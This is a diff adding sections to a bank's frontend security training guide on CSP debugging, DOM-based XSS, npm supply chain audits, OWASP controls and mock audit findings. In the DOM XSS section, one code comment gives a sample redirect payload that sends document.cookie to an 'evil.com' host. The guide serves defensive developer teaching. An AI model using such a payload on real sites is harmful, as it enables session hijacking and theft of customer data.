@@ -2,7 +2,7 @@
 
 > **EastWest Bank — Digital Platforms & Innovations**
 >
-> Part A (Core) · Level 7 — Production · Est. 3.5 hours
+> Part A (Core) · Level 7 — Production · Est. 5 hours
 
 ---
 
@@ -11,9 +11,14 @@
 By the end of this guide, you will:
 
 - Implement Content Security Policy (CSP) for XSS prevention
+- Debug CSP violation reports and resolve common banking-specific violations
 - Use Subresource Integrity (SRI) for third-party scripts
 - Understand browser-native XSS prevention mechanisms
+- Identify and prevent DOM-based XSS and third-party script risks
+- Audit npm dependencies for supply chain attacks
 - Prevent common OWASP Top 10 vulnerabilities in React
+- Map OWASP Top 10 items to concrete frontend controls for banking SPAs
+- Interpret and respond to real security audit findings
 - Implement secure input handling and output encoding
 - Configure CORS correctly for banking APIs
 - Build a security-aware development checklist
@@ -89,6 +94,112 @@ Why does the CSP include `'unsafe-inline'` for `style-src` but NOT for
 
 ---
 
+## Phase 1b — CSP Violation Debugging
+
+### Reading a CSP violation report
+
+When the browser blocks a resource that violates your policy, it sends a JSON
+report to the endpoint specified in `report-uri`. Here is what a real violation
+report looks like:
+
+```json
+{
+  "csp-report": {
+    "document-uri": "https://portal.ewbanking.com/dashboard",
+    "referrer": "",
+    "violated-directive": "script-src 'self'",
+    "effective-directive": "script-src",
+    "original-policy": "default-src 'self'; script-src 'self'; report-uri /api/csp-report",
+    "blocked-uri": "https://analytics.third-party.com/tracker.js",
+    "status-code": 200,
+    "source-file": "https://portal.ewbanking.com/dashboard",
+    "line-number": 42,
+    "column-number": 8
+  }
+}
+```
+
+### Step-by-step debugging
+
+1. **Identify the blocked resource.** Look at `blocked-uri` — this tells you
+   exactly which resource was blocked. In this case, a third-party analytics
+   script.
+
+2. **Check the violated directive.** The `violated-directive` field shows which
+   CSP rule blocked it. Here, `script-src 'self'` means only same-origin
+   scripts are allowed.
+
+3. **Find the source.** The `source-file` and `line-number` show where in your
+   code the resource was requested. This helps you track down who added it.
+
+4. **Decide: allow or fix.** This is the critical decision:
+   - If the resource is legitimate and required, add its domain to the
+     appropriate CSP directive.
+   - If the resource was injected or is not approved, investigate how it got
+     there and remove it.
+
+### Common CSP violations in banking applications
+
+**Inline event handlers from legacy code:**
+
+```html
+<!-- VIOLATION: Blocked by script-src 'self' -->
+<button onclick="submitTransfer()">Submit</button>
+
+<!-- FIX: Use addEventListener or React's onClick -->
+<button onClick={handleSubmitTransfer}>Submit</button>
+```
+
+Legacy pages migrated into your SPA may carry inline handlers. These must be
+refactored — never weaken CSP to accommodate them.
+
+**Third-party analytics scripts:**
+
+Marketing teams often add tracking pixels and analytics scripts by pasting
+`<script>` tags. These will be blocked unless explicitly allowed in CSP.
+The correct process is to route these through your security review before
+adding the domain to `script-src`.
+
+**Embedded iframes from payment processors:**
+
+Payment processor iframes are legitimate but must be explicitly allowed:
+
+```
+frame-src https://tokenizer.payment-processor.com;
+```
+
+Do not set `frame-src *` — whitelist only the exact domains your payment
+processor uses.
+
+### `report-uri` vs `report-to`
+
+| Feature | `report-uri` | `report-to` |
+|---------|-------------|-------------|
+| Status | Deprecated but widely supported | Modern replacement |
+| Format | Sends individual JSON reports | Uses Reporting API, batched delivery |
+| Browser support | All browsers | Chrome, Edge (limited Firefox/Safari) |
+| Recommendation | Use both during transition | Will eventually replace `report-uri` |
+
+For production, use both until `report-to` has full browser support:
+
+```
+Content-Security-Policy:
+  default-src 'self';
+  report-uri /api/csp-report;
+  report-to csp-endpoint;
+
+Report-To: {"group":"csp-endpoint","max_age":86400,"endpoints":[{"url":"/api/csp-report-v2"}]}
+```
+
+### Checkpoint 1b
+
+Your CSP is blocking a third-party analytics script that the marketing team
+added to the banking portal. What do you do? (Consider: security review
+process, BSP 1019 logging requirements, whether the script is necessary, and
+how to add it safely if approved.)
+
+---
+
 ## Phase 2 — XSS Prevention in React
 
 ### React's built-in protection
@@ -156,6 +267,138 @@ function SafeHtml({ html }: { html: string }) {
 A developer needs to render HTML from a CMS (content management system) for
 marketing pages on the banking site. What is the safest approach? What tags
 and attributes should be allowed?
+
+---
+
+## Phase 2b — DOM-Based XSS and Third-Party Risks
+
+### DOM-based XSS patterns
+
+DOM-based XSS occurs when client-side JavaScript reads data from an
+attacker-controllable source and writes it to a dangerous sink — without
+the data ever reaching the server. React's JSX escaping does not protect
+against all of these.
+
+**Dangerous sources in a banking SPA:**
+
+```tsx
+// DANGEROUS — URL fragments and query params
+const params = new URLSearchParams(window.location.search);
+const redirectUrl = params.get('redirect');
+// Attacker sets: ?redirect=javascript:void(document.location='https://evil.com/steal?cookie='+document.cookie)
+
+// DANGEROUS — window.name persists across navigations
+const sessionData = window.name;
+// Attacker sets window.name on a page they control, then redirects to your app
+
+// DANGEROUS — postMessage without origin validation
+window.addEventListener('message', (event) => {
+  // If you don't check event.origin, ANY page can send messages
+  document.getElementById('output')!.innerHTML = event.data;
+});
+```
+
+**Safe postMessage handling:**
+
+```tsx
+// src/lib/post-message-handler.ts
+const TRUSTED_ORIGINS: readonly string[] = [
+  'https://tokenizer.payment-processor.com',
+  'https://portal.ewbanking.com',
+] as const;
+
+window.addEventListener('message', (event: MessageEvent) => {
+  if (!TRUSTED_ORIGINS.includes(event.origin)) {
+    console.warn(`Rejected postMessage from untrusted origin: ${event.origin}`);
+    return;
+  }
+
+  // Validate the message shape with Zod before acting on it
+  const result = postMessageSchema.safeParse(event.data);
+  if (!result.success) {
+    console.warn('Rejected malformed postMessage:', result.error.issues);
+    return;
+  }
+
+  handleTrustedMessage(result.data);
+});
+```
+
+### Third-party script risks
+
+Every third-party script you load has full access to your page's DOM, cookies
+(non-HttpOnly), and localStorage. In a banking application, this means a
+compromised third-party script can:
+
+- Read any DOM content, including account numbers and balances
+- Capture keystrokes in login and transfer forms
+- Exfiltrate session tokens from localStorage
+- Modify the DOM to show fake transfer confirmations
+
+**Real-world example:** A third-party customer support chat widget injected a
+script that could read DOM content, including masked account numbers that were
+unmasked in the DOM but hidden with CSS (`visibility: hidden`). The account
+numbers were fully readable to any JavaScript running on the page. An attacker
+who compromised the chat widget's CDN could have silently exfiltrated customer
+account data.
+
+**Categories of third-party risk:**
+
+| Category | Examples | Risk Level |
+|----------|----------|------------|
+| Analytics | Google Analytics, Mixpanel, Hotjar | High — full DOM access, keystroke recording |
+| Chat widgets | Zendesk, Intercom, LiveChat | High — inject DOM overlays, read page content |
+| A/B testing | Optimizely, LaunchDarkly (client-side) | Critical — modifies DOM, can alter transaction flows |
+| Error tracking | Sentry, Datadog RUM | Medium — reads stack traces containing data |
+
+### Auditing npm dependencies
+
+Supply chain attacks target the packages you install. A compromised dependency
+runs arbitrary code during `npm install` (postinstall scripts) or at runtime.
+
+```bash
+# Built-in audit — check for known vulnerabilities
+npm audit
+
+# Fail CI builds on high/critical findings
+npm audit --audit-level=high
+
+# Investigate a specific package
+npm audit --json | jq '.vulnerabilities | to_entries[] | select(.value.severity == "high")'
+```
+
+**Additional tools for banking-grade security:**
+
+```bash
+# Socket.dev — detects supply chain attacks (typosquatting, install scripts, etc.)
+npx socket scan
+
+# Snyk — deeper vulnerability database with fix recommendations
+npx snyk test
+```
+
+**Supply chain attack scenario:**
+
+1. Attacker publishes `react-data-grid-pro` (typosquatting `react-datagrid-pro`)
+2. Package includes a postinstall script that exfiltrates `.env` files
+3. At runtime, it intercepts `fetch()` and copies request bodies to an external server
+4. All API payloads — including transfer amounts, account numbers, auth tokens — are exfiltrated
+
+**Defenses:**
+
+- Lock dependencies with `package-lock.json` — always commit it
+- Review `npm audit` output in every CI build
+- Use `--ignore-scripts` during CI installs when possible
+- Pin exact versions for critical dependencies (no `^` or `~`)
+- Review new dependencies before adding them — check download count,
+  maintainers, last publish date, and whether the package has install scripts
+
+### Checkpoint 2b
+
+Your team wants to add a third-party customer support chat widget to the
+banking portal. What security review process should this go through before
+it is approved? Consider: CSP changes, DOM access, data exposure, BSP 1019
+logging, and vendor assessment.
 
 ---
 
@@ -367,6 +610,374 @@ malicious scripts instead of the expected JSON response.
 
 ---
 
+## Phase 6b — OWASP Top 10 for React Banking Apps
+
+The OWASP Top 10 (2021) is the industry standard classification of web
+application security risks. While several items are primarily backend concerns,
+every item has frontend implications in a banking SPA. This section maps each
+relevant item to concrete React controls you must implement.
+
+### OWASP mapping table
+
+| # | OWASP Item | Frontend Control | Test / Verification |
+|---|-----------|-----------------|-------------------|
+| A01 | Broken Access Control | RBAC route guards, component-level permission checks, API authorization headers | Attempt to access admin routes as regular user; verify redirect |
+| A02 | Cryptographic Failures | HTTPS-only, no secrets in client code, SRI on external resources | Scan bundle output for API keys; verify SRI hashes |
+| A03 | Injection | CSP, Zod input validation, DOMPurify for HTML rendering | CSP violation reports; fuzz input fields with injection payloads |
+| A05 | Security Misconfiguration | Security headers present, debug mode disabled, error pages sanitized | Automated header scan; verify no stack traces in production errors |
+| A07 | Cross-Site Scripting | React auto-escaping, DOMPurify, CSP script-src without unsafe-inline | Inject `<script>` tags in all input fields; verify CSP blocks inline scripts |
+| A08 | Insecure Deserialization | Zod validation of all API responses and external data | Send malformed JSON; verify Zod rejects it before the app processes it |
+| A09 | Security Logging & Monitoring Failures | CSP violation reports, audit trail for sensitive actions, error monitoring | Verify CSP reports reach the logging endpoint; check audit trail completeness |
+
+### A01 — Broken Access Control
+
+The frontend is never the source of truth for access control — the API must
+enforce permissions. But the frontend must also enforce route guards to prevent
+users from seeing UI they should not access, and to provide clear feedback
+when access is denied.
+
+```tsx
+// src/features/auth/components/require-role.tsx
+import { Navigate } from 'react-router';
+import { useAuth } from '../hooks/use-auth';
+
+interface RequireRoleProps {
+  roles: readonly string[];
+  children: React.ReactNode;
+}
+
+export function RequireRole({ roles, children }: RequireRoleProps) {
+  const { user } = useAuth();
+
+  if (!user) {
+    return <Navigate to="/login" replace />;
+  }
+
+  if (!roles.includes(user.role)) {
+    // Log the unauthorized access attempt (BSP 1019)
+    console.warn(`Access denied: user ${user.id} attempted to access role-restricted route`);
+    return <Navigate to="/unauthorized" replace />;
+  }
+
+  return <>{children}</>;
+}
+```
+
+Even with route guards, every API call must include authorization headers,
+and the backend must independently verify permissions. The frontend guard
+is UX — the backend guard is security.
+
+### A02 — Cryptographic Failures
+
+```tsx
+// NEVER store secrets in client-side code
+// These VITE_ variables are embedded in the bundle and visible to anyone
+
+// BAD — secret exposed in the browser
+const API_SECRET = import.meta.env.VITE_API_SECRET; // Visible in bundle
+
+// GOOD — only non-secret configuration in VITE_ variables
+const API_BASE = import.meta.env.VITE_API_BASE_URL; // Public URL, not a secret
+```
+
+Verify no secrets leak into the production bundle:
+
+```bash
+# Search the built output for common secret patterns
+grep -r "SECRET\|PASSWORD\|PRIVATE_KEY\|api_key" dist/ && echo "SECRETS FOUND IN BUNDLE" && exit 1
+```
+
+### A03 — Injection
+
+The frontend cannot prevent SQL injection (that is a backend responsibility),
+but it must never construct raw queries or pass unsanitized input to APIs
+that might interpolate it:
+
+```tsx
+// BAD — constructing a filter string that the backend might interpolate
+const query = `SELECT * FROM accounts WHERE name = '${userInput}'`;
+
+// GOOD — send structured data, let the backend use parameterized queries
+const response = await apiClient.get('/accounts', {
+  params: { name: searchQuerySchema.parse(userInput) },
+});
+```
+
+CSP provides the strongest frontend defense against injection — it prevents
+injected scripts from executing even if they reach the DOM.
+
+### A05 — Security Misconfiguration
+
+Production builds must disable all debugging features:
+
+```tsx
+// vite.config.ts — production safety
+export default defineConfig({
+  build: {
+    // Remove console.log in production
+    minify: 'terser',
+    terserOptions: {
+      compress: {
+        drop_console: true,
+        drop_debugger: true,
+      },
+    },
+  },
+});
+```
+
+Error pages must never expose stack traces, file paths, or internal
+architecture details. Use generic error messages in production (see A13).
+
+### A07 — Cross-Site Scripting
+
+Covered in depth in Phase 2 and Phase 2b. The layered defense is:
+
+1. React's automatic escaping (first line of defense)
+2. DOMPurify for any HTML that must be rendered (second line)
+3. CSP blocking inline scripts and unauthorized external scripts (third line)
+4. Input validation with Zod at all boundaries (fourth line)
+
+### A08 — Insecure Deserialization
+
+In a React SPA, "deserialization" means parsing API responses, URL parameters,
+localStorage data, and postMessage payloads. All of these are untrusted input.
+
+```tsx
+// src/lib/api-client.ts
+import { z } from 'zod';
+
+// Every API response MUST be validated with Zod (BSP 1122)
+const accountResponseSchema = z.object({
+  id: z.string().uuid(),
+  accountNumber: z.string().regex(/^\d{10,12}$/),
+  balance: z.number().nonnegative(),
+  currency: z.literal('PHP'),
+  status: z.enum(['active', 'frozen', 'closed']),
+});
+
+type AccountResponse = z.infer<typeof accountResponseSchema>;
+
+export async function getAccount(id: string): Promise<AccountResponse> {
+  const response = await apiClient.get(`/accounts/${id}`);
+  return accountResponseSchema.parse(response.data);
+}
+```
+
+### A09 — Security Logging and Monitoring Failures
+
+BSP Circular 1019 requires comprehensive logging of security events. On the
+frontend, this means:
+
+- CSP violation reports sent to a monitored endpoint
+- Failed authentication attempts logged with timestamps
+- Unauthorized route access attempts captured
+- Session expiration events tracked
+
+```tsx
+// src/lib/security-logger.ts
+export function logSecurityEvent(event: {
+  type: 'csp_violation' | 'auth_failure' | 'unauthorized_access' | 'session_expired';
+  details: Record<string, unknown>;
+}): void {
+  // Send to backend logging endpoint — never log PII
+  void apiClient.post('/api/security-events', {
+    ...event,
+    timestamp: new Date().toISOString(),
+    userAgent: navigator.userAgent,
+  });
+}
+```
+
+### Items primarily handled by the backend
+
+| # | OWASP Item | Why it is backend-focused | Frontend awareness |
+|---|-----------|--------------------------|-------------------|
+| A04 | Insecure Design | Architecture-level concern | Follow secure design patterns in this guide |
+| A06 | Vulnerable and Outdated Components | Dependency management | Run `npm audit` in CI (see Phase 2b) |
+| A10 | Server-Side Request Forgery (SSRF) | Server-side only | No frontend control, but never send user-controlled URLs to the backend without validation |
+
+These items exist and your backend team must address them. As frontend
+developers, your responsibility is to understand them and not introduce
+patterns that make backend exploitation easier.
+
+---
+
+## Phase 6c — What Audit Findings Look Like
+
+Security audits are a regular part of banking compliance. BSP examiners and
+third-party auditors will test your application and produce findings in a
+standard format. Knowing what these look like helps you fix issues quickly
+and prevents surprises during examination.
+
+### Finding: CSP Allows unsafe-eval
+
+**Severity:** High
+
+**Description:** The Content Security Policy includes `'unsafe-eval'` in the
+`script-src` directive, which allows the execution of dynamically constructed
+JavaScript code. This significantly weakens XSS protections.
+
+**Evidence:** HTTP response header observed:
+`Content-Security-Policy: script-src 'self' 'unsafe-eval'`
+
+**Impact:** An attacker who achieves limited XSS can escalate to full code
+execution by using `eval()`, `setTimeout('string')`, or `new Function()`.
+In a banking context, this could allow unauthorized fund transfers, session
+hijacking, or customer data exfiltration.
+
+**Remediation:** Remove `'unsafe-eval'` from `script-src`. Audit all
+JavaScript code for `eval()`, `new Function()`, or string-based
+`setTimeout`/`setInterval` calls and replace them with safe alternatives.
+Ensure no npm dependencies require `eval()` at runtime.
+
+**Verification:** Rescan the response headers. Confirm `'unsafe-eval'` is
+absent. Run the application and verify no functionality is broken.
+
+---
+
+### Finding: Missing Permissions-Policy Header
+
+**Severity:** Medium
+
+**Description:** The application does not set a `Permissions-Policy` header,
+allowing the page (and any embedded third-party content) to request access to
+sensitive browser features such as camera, microphone, and geolocation.
+
+**Evidence:** HTTP response headers do not include `Permissions-Policy`.
+Verified with: `curl -I https://portal.ewbanking.com | grep -i permissions`
+
+**Impact:** A compromised third-party script or XSS exploit could request
+camera or microphone access, potentially recording the user without consent.
+While browser permission prompts provide some protection, the absence of the
+policy header means the capability is not explicitly denied at the HTTP level.
+
+**Remediation:** Add the following header to all responses:
+`Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=()`
+Configure this in Azure Front Door or the application's response headers.
+
+**Verification:** Rescan response headers. Confirm `Permissions-Policy` is
+present and disables unused features.
+
+---
+
+### Finding: PII Visible in Browser Console Logs
+
+**Severity:** High
+
+**Description:** Customer personally identifiable information (PII) including
+full names and email addresses is logged to the browser console during normal
+application operation. This data is accessible to any JavaScript running on
+the page, including third-party scripts.
+
+**Evidence:** Opening browser DevTools on the account details page shows:
+`[AccountService] Loaded account for: Juan Dela Cruz (juan.delacruz@email.com)`
+This was observed in the production build.
+
+**Impact:** Any third-party script with DOM access can read console output.
+If a third-party analytics or chat widget is compromised, it could harvest
+customer PII. This violates BSP Circular 1019 data protection requirements
+and the Data Privacy Act of 2012.
+
+**Remediation:** Remove all `console.log` statements that output PII. In
+production builds, strip console statements entirely using Terser
+configuration. For necessary debugging, use opaque identifiers (user ID,
+account reference number) instead of names, emails, or account numbers.
+
+**Verification:** Build the production bundle and search the output for
+`console.log`. Run the application and verify no PII appears in DevTools.
+
+---
+
+### Finding: Third-Party Scripts Loaded Without SRI
+
+**Severity:** Medium
+
+**Description:** External JavaScript files are loaded from CDN domains without
+Subresource Integrity (SRI) hashes. If the CDN is compromised, modified scripts
+will execute without detection.
+
+**Evidence:** HTML source contains:
+`<script src="https://cdn.example.com/analytics.js"></script>`
+No `integrity` attribute is present on the tag.
+
+**Impact:** A CDN compromise (or DNS hijack) could serve a modified script
+that captures user input, including credentials and transaction details. The
+browser would execute the modified script without warning.
+
+**Remediation:** Add `integrity` and `crossorigin` attributes to all external
+script and stylesheet tags. Use the `vite-plugin-sri` plugin for build-time
+assets. For runtime-loaded external scripts, compute and pin SRI hashes as
+part of the deployment process.
+
+**Verification:** Inspect the HTML source for all `<script>` and `<link>` tags.
+Confirm every external resource has a valid `integrity` attribute. Modify a
+cached script file and verify the browser blocks it.
+
+---
+
+### Finding: Session Timeout Not Enforced on Sensitive Pages
+
+**Severity:** High
+
+**Description:** The application does not enforce session timeout on pages
+that display or process sensitive financial data. A user who walks away from
+their workstation remains authenticated indefinitely until the server-side
+session expires.
+
+**Evidence:** Opened the fund transfer page, left the browser idle for 30
+minutes, and was able to submit a transfer without re-authentication. BSP
+Circular 982 requires session timeout and re-authentication for sensitive
+operations.
+
+**Impact:** An unattended workstation with an active banking session is a
+direct path to unauthorized transactions. In branch or back-office
+environments, this is a significant operational risk.
+
+**Remediation:** Implement an idle timeout that locks the session after a
+configurable period (recommended: 5 minutes for transaction pages, 15 minutes
+for read-only pages). On timeout, require re-authentication before allowing
+further actions. Implement an activity monitor that tracks mouse, keyboard,
+and touch events.
+
+```tsx
+// src/features/auth/hooks/use-idle-timeout.ts
+import { useEffect, useRef, useCallback } from 'react';
+
+export function useIdleTimeout(timeoutMs: number, onTimeout: () => void): void {
+  const timerRef = useRef<ReturnType<typeof setTimeout>>();
+
+  const resetTimer = useCallback(() => {
+    if (timerRef.current) {
+      clearTimeout(timerRef.current);
+    }
+    timerRef.current = setTimeout(onTimeout, timeoutMs);
+  }, [timeoutMs, onTimeout]);
+
+  useEffect(() => {
+    const events: Array<keyof WindowEventMap> = [
+      'mousedown', 'keydown', 'touchstart', 'scroll',
+    ];
+
+    events.forEach((event) => window.addEventListener(event, resetTimer));
+    resetTimer(); // Start the timer
+
+    return () => {
+      events.forEach((event) => window.removeEventListener(event, resetTimer));
+      if (timerRef.current) {
+        clearTimeout(timerRef.current);
+      }
+    };
+  }, [resetTimer]);
+}
+```
+
+**Verification:** Set the idle timeout to 5 minutes. Leave the session idle
+and confirm the application locks and requires re-authentication. Verify that
+user activity (mouse, keyboard) resets the timer.
+
+---
+
 ## Phase 7 — Security Checklist
 
 ### Development security checklist
@@ -379,8 +990,9 @@ malicious scripts instead of the expected JSON response.
 | No PII in logs or error messages | Use IDs, not names/emails |
 | All API responses validated with Zod | BSP 1122 |
 | Auth tokens in memory only | BSP 982 |
-| CSP headers configured | A15 |
-| SRI on external resources | A15 |
+| CSP headers configured | A15 Phase 1 |
+| CSP violation reports monitored | A15 Phase 1b — route reports to BSP 1019 logging |
+| SRI on external resources | A15 Phase 3 |
 | No raw card numbers in JavaScript | PCI-DSS |
 | `rel="noopener noreferrer"` on external links | Prevent tab-napping |
 | HTTPS everywhere | `upgrade-insecure-requests` in CSP |
@@ -388,6 +1000,18 @@ malicious scripts instead of the expected JSON response.
 | CSRF protection | `SameSite=Strict` on cookies + CSRF tokens for transfers |
 | Permissions-Policy header | Restrict camera, microphone, geolocation, payment, USB |
 | Content-Type validation | Reject non-JSON responses from API endpoints |
+| postMessage origin validation | Only accept messages from trusted origins (Phase 2b) |
+| Third-party scripts reviewed and approved | Security review before adding any external script |
+| npm dependencies audited | `npm audit` in CI, fail on high/critical (Phase 2b) |
+| No DOM-based XSS sinks | No unvalidated use of `document.location`, `window.name`, `innerHTML` |
+| RBAC route guards in place | Frontend enforces role-based access (A01) |
+| No secrets in production bundle | Scan `dist/` output for key patterns (A02) |
+| Console statements stripped in production | Terser `drop_console` enabled (A05) |
+| Zod validation on all external data | API responses, URL params, postMessage, localStorage (A08) |
+| Security events logged | CSP violations, auth failures, unauthorized access (BSP 1019) |
+| Session idle timeout enforced | 5 min for transactions, 15 min for read-only (BSP 982) |
+| Supply chain defenses active | Lockfile committed, exact pins for critical deps (Phase 2b) |
+| OWASP Top 10 controls mapped | All applicable items addressed (Phase 6b) |
 
 ---
 
@@ -415,6 +1039,16 @@ malicious scripts instead of the expected JSON response.
 7. **Permissions-Policy** restricts browser features your app should never use.
    Disable camera, microphone, geolocation, and payment API access.
 
+8. **DOM-based XSS and third-party scripts** are attack vectors that React
+   cannot prevent alone. Validate postMessage origins, audit dependencies,
+   and security-review every third-party script before deployment.
+
+9. **Map your controls to OWASP Top 10** — auditors will ask about each item.
+   Know which controls address which risks.
+
+10. **Understand audit findings** — when an auditor reports an issue, you need
+    to know the severity, impact, and remediation path without delay.
+
 ---
 
 ## Exercises
@@ -433,6 +1067,16 @@ headers.
 Set up `npm audit` in the CI pipeline. Configure it to fail the build on
 critical and high severity vulnerabilities. Document the process for reviewing
 and resolving audit findings.
+
+### Exercise 4 — OWASP Control Mapping
+For each OWASP Top 10 item in Phase 6b, write a test (manual or automated)
+that verifies the corresponding frontend control is in place. Document the
+test procedure and expected results.
+
+### Exercise 5 — Mock Audit Response
+Using the audit finding format from Phase 6c, write a remediation plan for
+all five findings. Include time estimates, code changes required, and
+verification steps. Present this as you would to a BSP examiner.
 
 ---
 
